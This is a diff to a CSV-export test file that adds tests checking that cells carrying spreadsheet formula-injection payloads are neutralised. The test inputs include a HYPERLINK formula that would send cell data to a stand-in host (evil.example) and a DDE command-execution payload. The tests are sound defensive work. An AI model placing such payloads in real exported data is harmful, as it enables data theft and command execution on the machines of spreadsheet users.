@@ -1,6 +1,13 @@
 import { test, expect } from "vitest";
 import { parse } from "csv-parse/sync";
-import { groupsDailyToCsv, groupsToCsv, membersDailyLongToCsv, membersDailyToCsv, membersDailyCost } from "./export.js";
+import {
+  groupsDailyToCsv,
+  groupsToCsv,
+  membersDailyLongToCsv,
+  membersDailyToCsv,
+  membersDailyCost,
+  sanitizeCsvCell,
+} from "./export.js";
 import type { GroupDayRow, GroupRow } from "./aggregate.js";
 import { userProductRow } from "./__fixtures__/index.js";
 
@@ -93,6 +100,44 @@ test("membersDailyLongToCsv: renders cost in dollars and omits days with no cost
   );
   expect(out).toHaveLength(1);
   expect(out[0]).toEqual({ Member: "a@x.com", Date: "2026-06-01", Cost: "2.50" });
+});
+
+test("sanitizeCsvCell: neutralises formula-injection prefixes but leaves ordinary text alone", () => {
+  expect(sanitizeCsvCell('=HYPERLINK("http://evil.example/","click")')).toBe(
+    '\'=HYPERLINK("http://evil.example/","click")',
+  );
+  expect(sanitizeCsvCell("+1234")).toBe("'+1234");
+  expect(sanitizeCsvCell("-1234")).toBe("'-1234");
+  expect(sanitizeCsvCell("@SUM(A1)")).toBe("'@SUM(A1)");
+  expect(sanitizeCsvCell("\tformula")).toBe("'\tformula");
+  expect(sanitizeCsvCell("Acme")).toBe("Acme");
+  expect(sanitizeCsvCell("a@x.com")).toBe("a@x.com");
+});
+
+test("groupsToCsv: a formula-injection project name round-trips without a leading =", () => {
+  const out = rows(groupsToCsv([group({ key: '=HYPERLINK("http://evil.example/"&A1,"click")' })], "project"));
+  expect(out[0]!.project!.startsWith("=")).toBe(false);
+});
+
+test("membersDailyToCsv: a formula-injection email and attribute value round-trip without a leading formula prefix", () => {
+  const out = rows(
+    membersDailyToCsv(
+      [
+        {
+          email: "=cmd|'/c calc'!A0",
+          attributes: { team: "+1;DDE" },
+          costByDate: {},
+          totalCostCents: 0,
+          totalTokens: 0,
+          requests: 0,
+        },
+      ],
+      [],
+      ["team"],
+    ),
+  );
+  expect(out[0]!.email!.startsWith("=")).toBe(false);
+  expect(out[0]!.team!.startsWith("+")).toBe(false);
 });
 
 test("membersDailyCost: builds a cents total per member across products, seeded from the full email list", () => {
